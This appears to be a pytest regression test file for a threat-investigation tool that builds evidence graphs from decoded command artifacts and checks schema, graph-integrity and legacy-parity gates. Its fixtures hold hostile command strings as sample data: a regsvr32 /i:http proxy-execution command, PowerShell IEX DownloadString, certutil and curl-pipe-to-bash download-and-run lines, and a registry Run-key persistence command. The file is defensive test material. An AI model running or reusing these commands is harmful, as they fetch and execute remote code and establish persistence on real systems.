"""ADR-0014 · Slice-A · CIO Builder + Validators regression tests.

Locks the composer contract and all three §7.1 release gates.
"""
from __future__ import annotations

import pytest

from nivxforge.cim.fact_substrate import (
    DecoderLayer,
    FactSubstrate,
    IOCRecord,
    MITREHit,
    TIHitRecord,
)
from nivxforge.investigation import (
    CIO,
    CIOValidationError,
    build_cio,
    validate_cio,
)


# ─── Fixtures ──────────────────────────────────────────────────────────

def _regsvr32_payload_substrate() -> FactSubstrate:
    """Corpus-style FactSubstrate for the regsvr32 partial-recovery payload."""
    return FactSubstrate(
        input_text=("regsvr32 /u /s /i:http://192.1"),
        input_kind="powershell",
        source_endpoint="/api/decode/smart",
        decoder_chain=[
            DecoderLayer(
                idx=0,
                op="powershell-encoded",
                input_kind="b64",
                output_kind="text",
                output_preview="regsvr32 /u /s /i:http://192.1",
                confidence="Strongly Inferred",
            ),
        ],
        iocs=[
            IOCRecord(
                kind="url",
                value="http://192.1",
                normalized_value="http://192.1",
                stage_passed=["syntactic", "context"],
            ),
        ],
        mitre_hits=[
            MITREHit(technique_id="T1218.010", name="Regsvr32", tactic="Defense Evasion"),
            MITREHit(technique_id="T1071.001", name="Web Protocols", tactic="C2"),
        ],
        ti_hits=[
            TIHitRecord(provider="internal", label="signed-binary proxy",
                        subject="regsvr32", confidence="Possible"),
        ],
        reasoning_notes=["Observed signed-binary proxy execution via regsvr32 /i:http*"],
    )


# ─── Builder shape ─────────────────────────────────────────────────────

class TestBuilderShape:
    def test_produces_valid_cio(self):
        fs = _regsvr32_payload_substrate()
        cio = build_cio(fs)
        assert isinstance(cio, CIO)
        assert cio.schema_version == "0.1"
        assert cio.cio_id.startswith("CIO-")
        assert cio.source.endpoint == "/api/decode/smart"

    def test_artifact_root_present(self):
        cio = build_cio(_regsvr32_payload_substrate())
        artifacts = cio.evidence_graph.nodes_by_kind("artifact")
        assert len(artifacts) == 1
        assert artifacts[0].confidence == 1.0

    def test_decoder_layer_becomes_fragment_node(self):
        cio = build_cio(_regsvr32_payload_substrate())
        frags = cio.evidence_graph.nodes_by_kind("decoded_fragment")
        assert len(frags) == 1
        assert "regsvr32" in (frags[0].value or "")

    def test_ioc_url_becomes_node(self):
        cio = build_cio(_regsvr32_payload_substrate())
        iocs = cio.evidence_graph.nodes_by_kind("ioc")
        assert len(iocs) == 1
        assert iocs[0].value == "http://192.1"

    def test_mitre_techniques_deduped_and_present(self):
        cio = build_cio(_regsvr32_payload_substrate())
        tech = cio.evidence_graph.nodes_by_kind("mitre_technique")
        assert {n.value for n in tech} == {"T1218.010", "T1071.001"}

    def test_lolbin_regsvr32_detected(self):
        cio = build_cio(_regsvr32_payload_substrate())
        lolbins = cio.evidence_graph.nodes_by_kind("lolbin")
        assert "regsvr32" in {n.value for n in lolbins}

    def test_decode_chain_projection_matches_graph(self):
        cio = build_cio(_regsvr32_payload_substrate())
        assert len(cio.decode_chain) == 1
        assert cio.decode_chain[0]["op"] == "powershell-encoded"
        # projection carries the node id
        assert cio.decode_chain[0]["node_id"] is not None

    def test_confidence_within_bounds(self):
        cio = build_cio(_regsvr32_payload_substrate())
        assert 0.0 <= cio.confidence <= 1.0


# ─── Determinism (identical input → identical graph) ──────────────────

class TestDeterminism:
    def test_same_substrate_produces_identical_graph_serialization(self):
        fs = _regsvr32_payload_substrate()
        c1 = build_cio(fs)
        c2 = build_cio(fs)
        assert (
            c1.evidence_graph.deterministic_serialize()
            == c2.evidence_graph.deterministic_serialize()
        )

    def test_same_substrate_produces_identical_cio_id(self):
        fs = _regsvr32_payload_substrate()
        assert build_cio(fs).cio_id == build_cio(fs).cio_id


# ─── G1 Schema gate ────────────────────────────────────────────────────

class TestG1Schema:
    def test_valid_cio_passes_g1(self):
        cio = build_cio(_regsvr32_payload_substrate())
        validate_cio(cio)  # should not raise

    def test_mutated_schema_version_rejected(self):
        cio = build_cio(_regsvr32_payload_substrate())
        cio.schema_version = "0.1"  # sanity
        cio.__dict__["schema_version"] = "9.9"  # bypass Literal for test
        with pytest.raises(CIOValidationError) as ex:
            validate_cio(cio)
        assert ex.value.code == "G1_SCHEMA_VERSION"


# ─── G2 Graph integrity gate ──────────────────────────────────────────

class TestG2Graph:
    def test_valid_graph_passes_g2(self):
        cio = build_cio(_regsvr32_payload_substrate())
        validate_cio(cio)

    def test_duplicate_node_id_rejected(self):
        cio = build_cio(_regsvr32_payload_substrate())
        # Force a duplicate id in the list (bypass add_node validation)
        cio.evidence_graph.nodes.append(cio.evidence_graph.nodes[0].model_copy())
        with pytest.raises(CIOValidationError) as ex:
            validate_cio(cio)
        assert ex.value.code == "G2_DUPLICATE_NODE_ID"

    def test_orphan_node_rejected(self):
        cio = build_cio(_regsvr32_payload_substrate())
        # Add a floating IOC with no incoming edge
        from nivxforge.investigation.graph import Node as GNode
        orphan = GNode(
            id="N-999",
            kind="ioc",
            label="orphan",
            value="1.2.3.4",
            confidence=0.5,
            provenance="test",
        )
        cio.evidence_graph.nodes.append(orphan)
        with pytest.raises(CIOValidationError) as ex:
            validate_cio(cio)
        assert ex.value.code == "G2_ORPHAN_NODES"


# ─── G3 Legacy parity gate ────────────────────────────────────────────

class TestG3LegacyParity:
    def test_added_sanctioned_key_passes(self):
        cio = build_cio(_regsvr32_payload_substrate())
        legacy = {"output": "regsvr32 /u /s /i:http://192.1", "mitre": ["T1218.010"]}
        post = {**legacy, "cio": cio.model_dump(mode="json")}
        validate_cio(cio, legacy=legacy, post=post, added_keys=["cio"])

    def test_legacy_value_change_rejected(self):
        cio = build_cio(_regsvr32_payload_substrate())
        legacy = {"output": "A", "mitre": ["T1218.010"]}
        post = {"output": "B", "mitre": ["T1218.010"], "cio": {}}
        with pytest.raises(CIOValidationError) as ex:
            validate_cio(cio, legacy=legacy, post=post, added_keys=["cio"])
        assert ex.value.code == "G3_LEGACY_VALUE_CHANGED"

    def test_legacy_key_removal_rejected(self):
        cio = build_cio(_regsvr32_payload_substrate())
        legacy = {"output": "A", "mitre": ["T1218.010"]}
        post = {"output": "A", "cio": {}}  # `mitre` dropped
        with pytest.raises(CIOValidationError) as ex:
            validate_cio(cio, legacy=legacy, post=post, added_keys=["cio"])
        assert ex.value.code == "G3_LEGACY_KEY_REMOVED"

    def test_unsanctioned_key_addition_rejected(self):
        cio = build_cio(_regsvr32_payload_substrate())
        legacy = {"output": "A"}
        post = {"output": "A", "cio": {}, "surprise": True}
        with pytest.raises(CIOValidationError) as ex:
            validate_cio(cio, legacy=legacy, post=post, added_keys=["cio"])
        assert ex.value.code == "G3_UNSANCTIONED_KEY_ADDED"


# ─── Input-agnostic principle (§1.1.8) ─────────────────────────────────

class TestInputAgnostic:
    """Any input_kind must produce a valid CIO."""

    @pytest.mark.parametrize("kind,text", [
        ("powershell", "IEX (New-Object Net.WebClient).DownloadString('http://x')"),
        ("cmd", "cmd /c certutil -urlcache -f http://x/a.exe a.exe"),
        ("bash", "curl http://x/a.sh | bash"),
        ("raw_log", "process=cmd.exe cli='reg add HKCU\\Software\\Run'"),
        ("json", '{"process":"cmd.exe","cli":"cmd /c whoami"}'),
    ])
    def test_various_input_kinds_produce_valid_cio(self, kind, text):
        fs = FactSubstrate(
            input_text=text,
            input_kind=kind,
            source_endpoint="/api/decode/smart",
            decoder_chain=[],
            iocs=[],
            mitre_hits=[],
        )
        cio = build_cio(fs)
        validate_cio(cio)
        assert cio.input_kind == kind
        # artifact root always present
        assert len(cio.evidence_graph.nodes_by_kind("artifact")) == 1
